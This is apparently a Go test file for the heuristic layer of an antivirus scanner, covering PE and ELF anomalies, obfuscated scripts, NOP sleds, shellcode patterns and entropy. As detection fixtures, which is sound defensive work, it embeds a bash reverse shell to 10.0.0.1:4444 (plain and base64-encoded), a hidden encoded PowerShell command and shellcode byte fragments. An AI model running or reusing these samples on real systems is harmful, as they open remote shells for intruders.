package heuristic

import (
	"bytes"
	"encoding/binary"
	"strings"
	"sync"
	"testing"

	"axiomnizam.bitbd.net/axiomnizam/internal/antivirus"
)

// ─────────────────────────────────────────────────────────────────────────────
// Layer Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestLayer_Name(t *testing.T) {
	l := New()
	if l.Name() != "heuristic" {
		t.Errorf("expected 'heuristic', got %q", l.Name())
	}
}

func TestLayer_Scan_CleanTextFile(t *testing.T) {
	l := New()
	threats, err := l.Scan(&antivirus.ScanTarget{
		Content: []byte("Hello, this is a clean text file."), Filename: "readme.txt",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(threats) != 0 {
		t.Errorf("clean text should have no threats, got %d", len(threats))
	}
}

func TestLayer_Scan_EmptyContent(t *testing.T) {
	l := New()
	threats, err := l.Scan(&antivirus.ScanTarget{Content: nil})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(threats) != 0 {
		t.Errorf("expected 0 threats, got %d", len(threats))
	}
}

func TestLayer_ConcurrentScans(t *testing.T) {
	l := New()
	var wg sync.WaitGroup
	for i := 0; i < 20; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			l.Scan(&antivirus.ScanTarget{
				Content: []byte("safe content"), Filename: "test.txt",
			})
		}()
	}
	wg.Wait()
	if l.Stats().TotalScans != 20 {
		t.Errorf("expected 20 scans, got %d", l.Stats().TotalScans)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// PE Tests
// ─────────────────────────────────────────────────────────────────────────────

// buildMinimalPE creates a minimal valid PE binary for testing.
func buildMinimalPE(sections []testSection) []byte {
	buf := make([]byte, 4096)

	// DOS header.
	copy(buf[0:2], []byte{0x4D, 0x5A}) // "MZ"
	binary.LittleEndian.PutUint32(buf[0x3C:0x40], 0x80) // e_lfanew

	// PE signature.
	copy(buf[0x80:0x84], []byte{0x50, 0x45, 0x00, 0x00})

	// COFF header.
	coffStart := 0x84
	binary.LittleEndian.PutUint16(buf[coffStart+2:coffStart+4], uint16(len(sections)))
	binary.LittleEndian.PutUint16(buf[coffStart+16:coffStart+18], 0x70) // optional header size

	// Optional header (PE32).
	optStart := coffStart + 20
	binary.LittleEndian.PutUint16(buf[optStart:optStart+2], 0x10b) // PE32 magic
	binary.LittleEndian.PutUint32(buf[optStart+16:optStart+20], 0x1000) // entry point

	// Section headers (start after optional header).
	sectionStart := optStart + 0x70
	for i, sec := range sections {
		off := sectionStart + i*40
		copy(buf[off:off+8], sec.name)
		binary.LittleEndian.PutUint32(buf[off+8:off+12], sec.virtualSize)
		binary.LittleEndian.PutUint32(buf[off+12:off+16], sec.virtualAddr)
		binary.LittleEndian.PutUint32(buf[off+16:off+20], sec.rawSize)
		binary.LittleEndian.PutUint32(buf[off+20:off+24], sec.rawOffset)
		binary.LittleEndian.PutUint32(buf[off+36:off+40], sec.characteristics)
	}

	return buf
}

type testSection struct {
	name            []byte
	virtualSize     uint32
	virtualAddr     uint32
	rawSize         uint32
	rawOffset       uint32
	characteristics uint32
}

func TestPE_ValidClean(t *testing.T) {
	pe := buildMinimalPE([]testSection{
		{name: []byte(".text\x00\x00\x00"), virtualSize: 0x100, virtualAddr: 0x1000,
			rawSize: 0x100, rawOffset: 0x200, characteristics: 0x60000020}, // CODE|EXEC|READ
	})
	findings := analyzePE(&antivirus.ScanTarget{Content: pe, Filename: "clean.exe"})
	// Entry point (0x1000) is in .text (vaddr 0x1000, size 0x100) — should be clean.
	for _, f := range findings {
		if f.Name == "Heuristic.PE.EntryPointAnomaly" {
			t.Error("entry point in .text should not trigger anomaly")
		}
	}
}

func TestPE_NotPE(t *testing.T) {
	findings := analyzePE(&antivirus.ScanTarget{
		Content: []byte("just a text file"), Filename: "test.txt",
	})
	if len(findings) != 0 {
		t.Error("non-PE file should produce no findings")
	}
}

func TestPE_PackerSectionName(t *testing.T) {
	pe := buildMinimalPE([]testSection{
		{name: []byte("UPX0\x00\x00\x00\x00"), virtualSize: 0x1000, virtualAddr: 0x1000,
			rawSize: 0x100, rawOffset: 0x200, characteristics: 0xE0000020},
		{name: []byte("UPX1\x00\x00\x00\x00"), virtualSize: 0x1000, virtualAddr: 0x2000,
			rawSize: 0x100, rawOffset: 0x300, characteristics: 0xE0000020},
	})
	findings := analyzePE(&antivirus.ScanTarget{Content: pe, Filename: "packed.exe"})

	found := false
	for _, f := range findings {
		if strings.Contains(f.Name, "Packer.UPX") {
			found = true
			break
		}
	}
	if !found {
		t.Error("UPX packer section should be detected")
	}
}

func TestPE_WritableExecutable(t *testing.T) {
	// 0xE0000020 = WRITE|EXECUTE|READ|CODE
	pe := buildMinimalPE([]testSection{
		{name: []byte(".text\x00\x00\x00"), virtualSize: 0x100, virtualAddr: 0x1000,
			rawSize: 0x100, rawOffset: 0x200, characteristics: 0xE0000020},
	})
	findings := analyzePE(&antivirus.ScanTarget{Content: pe, Filename: "wx.exe"})

	found := false
	for _, f := range findings {
		if f.Name == "Heuristic.PE.WritableExecutable" {
			found = true
			break
		}
	}
	if !found {
		t.Error("writable+executable section should be flagged")
	}
}

func TestPE_SizeMismatch(t *testing.T) {
	pe := buildMinimalPE([]testSection{
		{name: []byte(".text\x00\x00\x00"), virtualSize: 0x100000, virtualAddr: 0x1000,
			rawSize: 0x100, rawOffset: 0x200, characteristics: 0x60000020},
	})
	findings := analyzePE(&antivirus.ScanTarget{Content: pe, Filename: "unpack.exe"})

	found := false
	for _, f := range findings {
		if f.Name == "Heuristic.PE.SizeMismatch" {
			found = true
			break
		}
	}
	if !found {
		t.Error("10x size mismatch should be detected")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// ELF Tests
// ─────────────────────────────────────────────────────────────────────────────

// buildMinimalELF64 creates a minimal ELF64 binary with an executable stack.
func buildMinimalELF64(execStack bool) []byte {
	buf := make([]byte, 4096)

	// ELF header.
	copy(buf[0:4], elfMagic)
	buf[4] = elfClass64
	buf[5] = elfDataLSB
	buf[6] = 1 // EV_CURRENT

	binary.LittleEndian.PutUint16(buf[16:18], elfTypeExec)
	binary.LittleEndian.PutUint64(buf[32:40], 64)   // phoff
	binary.LittleEndian.PutUint16(buf[54:56], 56)    // phentsize
	binary.LittleEndian.PutUint16(buf[56:58], 1)     // phnum

	// Program header (GNU_STACK).
	phOff := 64
	binary.LittleEndian.PutUint32(buf[phOff:phOff+4], phTypeGnuStack)
	flags := uint32(pfW)
	if execStack {
		flags |= pfX
	}
	binary.LittleEndian.PutUint32(buf[phOff+4:phOff+8], flags)

	return buf
}

func TestELF_NotELF(t *testing.T) {
	findings := analyzeELF(&antivirus.ScanTarget{
		Content: []byte("not an elf"), Filename: "test.txt",
	})
	if len(findings) != 0 {
		t.Error("non-ELF should produce no findings")
	}
}

func TestELF_ExecutableStack(t *testing.T) {
	elf := buildMinimalELF64(true)
	findings := analyzeELF(&antivirus.ScanTarget{Content: elf, Filename: "exploit.elf"})

	found := false
	for _, f := range findings {
		if f.Name == "Heuristic.ELF.ExecutableStack" {
			found = true
			break
		}
	}
	if !found {
		t.Error("executable stack should be detected")
	}
}

func TestELF_NoExecStack(t *testing.T) {
	elf := buildMinimalELF64(false)
	findings := analyzeELF(&antivirus.ScanTarget{Content: elf, Filename: "safe.elf"})

	for _, f := range findings {
		if f.Name == "Heuristic.ELF.ExecutableStack" {
			t.Error("non-executable stack should not be flagged")
		}
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Script Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestScript_CleanJS(t *testing.T) {
	js := []byte(`<script>function hello() { console.log("hi"); }</script>`)
	findings := analyzeScript(&antivirus.ScanTarget{
		Content: js, Filename: "app.js", MIMEType: "application/javascript",
	})
	if len(findings) != 0 {
		t.Errorf("clean JS should have no findings, got %d", len(findings))
	}
}

func TestScript_ObfuscatedJS(t *testing.T) {
	// Heavily obfuscated JavaScript.
	js := []byte(`<script>
		var a = String.fromCharCode(72,101,108);
		var b = String.fromCharCode(108,111);
		eval(unescape("%48%65%6C%6C%6F"));
		var c = Function("return this")();
		document.write(unescape("%3c%73%63%72%69%70%74%3e"));
	</script>`)
	findings := analyzeScript(&antivirus.ScanTarget{
		Content: js, Filename: "obf.html", MIMEType: "text/html",
	})
	if len(findings) == 0 {
		t.Error("obfuscated JS should be detected")
	}
}

func TestScript_PowerShellEncoded(t *testing.T) {
	ps := []byte(`powershell -EncodedCommand SQBuAHYAbwBrAGUALQ... -nop -w hidden`)
	findings := analyzeScript(&antivirus.ScanTarget{
		Content: ps, Filename: "run.ps1",
	})
	if len(findings) == 0 {
		t.Error("encoded PowerShell should be detected")
	}
}

func TestScript_BashReverseShell(t *testing.T) {
	bash := []byte("#!/bin/bash\neval $(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d)\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
	findings := analyzeScript(&antivirus.ScanTarget{Content: bash, Filename: "rev.sh"})
	if len(findings) == 0 {
		t.Error("bash reverse shell should be detected")
	}
}

func TestScript_ExcessiveBase64(t *testing.T) {
	// Generate a large base64-like string.
	b64 := bytes.Repeat([]byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop0123456789+/="), 50)
	findings := analyzeScript(&antivirus.ScanTarget{
		Content: b64, Filename: "payload.txt",
	})
	found := false
	for _, f := range findings {
		if f.Name == "Heuristic.Script.ExcessiveBase64" {
			found = true
			break
		}
	}
	if !found {
		t.Error("excessive base64 content should be detected")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Shellcode Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestShellcode_NOPSled(t *testing.T) {
	data := append([]byte("JFIF header"), bytes.Repeat([]byte{0x90}, 64)...)
	findings := analyzeShellcode(&antivirus.ScanTarget{Content: data, Filename: "image.jpg"})

	found := false
	for _, f := range findings {
		if f.Name == "Heuristic.Shellcode.NOPSled" {
			found = true
			break
		}
	}
	if !found {
		t.Error("64-byte NOP sled should be detected")
	}
}

func TestShellcode_ShortNOP(t *testing.T) {
	data := append([]byte("data"), bytes.Repeat([]byte{0x90}, 8)...)
	findings := analyzeShellcode(&antivirus.ScanTarget{Content: data, Filename: "file.bin"})
	for _, f := range findings {
		if f.Name == "Heuristic.Shellcode.NOPSled" {
			t.Error("8-byte NOP run should NOT trigger (min is 16)")
		}
	}
}

func TestShellcode_MultipleIndicators(t *testing.T) {
	// File with INT 0x80 + register zeroing + XOR decode loop.
	data := make([]byte, 256)
	copy(data[0:4], []byte("data"))
	copy(data[10:14], []byte{0x31, 0xC9, 0xF7, 0xE1}) // XOR ECX; MUL ECX
	copy(data[20:22], []byte{0xCD, 0x80})               // INT 0x80
	copy(data[30:35], []byte{0x30, 0x1E, 0x46, 0xE2, 0xFB}) // XOR decode

	findings := analyzeShellcode(&antivirus.ScanTarget{Content: data, Filename: "doc.pdf"})
	found := false
	for _, f := range findings {
		if f.Name == "Heuristic.Shellcode.Patterns" {
			found = true
			break
		}
	}
	if !found {
		t.Error("multiple shellcode indicators should be detected")
	}
}

func TestShellcode_SkipsPE(t *testing.T) {
	data := make([]byte, 256)
	data[0] = 0x4D
	data[1] = 0x5A // MZ header
	copy(data[10:14], []byte{0x31, 0xC9, 0xF7, 0xE1})
	copy(data[20:22], []byte{0xCD, 0x80})

	findings := analyzeShellcode(&antivirus.ScanTarget{Content: data, Filename: "app.exe"})
	if len(findings) != 0 {
		t.Error("shellcode detection should skip PE files")
	}
}

func TestShellcode_SkipsELF(t *testing.T) {
	data := make([]byte, 256)
	copy(data[0:4], elfMagic)
	copy(data[10:12], []byte{0xCD, 0x80})

	findings := analyzeShellcode(&antivirus.ScanTarget{Content: data, Filename: "bin"})
	if len(findings) != 0 {
		t.Error("shellcode detection should skip ELF files")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Shannon Entropy Tests
// ─────────────────────────────────────────────────────────────────────────────

func TestShannonEntropy_AllSame(t *testing.T) {
	data := bytes.Repeat([]byte{0xAA}, 1000)
	ent := shannonEntropy(data)
	if ent > 0.01 {
		t.Errorf("uniform data should have ~0 entropy, got %.2f", ent)
	}
}

func TestShannonEntropy_HighEntropy(t *testing.T) {
	data := make([]byte, 1024)
	for i := range data {
		data[i] = byte(i % 256)
	}
	ent := shannonEntropy(data)
	if ent < 7.9 {
		t.Errorf("uniformly distributed data should have ~8.0 entropy, got %.2f", ent)
	}
}

func TestShannonEntropy_Empty(t *testing.T) {
	if shannonEntropy(nil) != 0 {
		t.Error("empty data should have 0 entropy")
	}
}
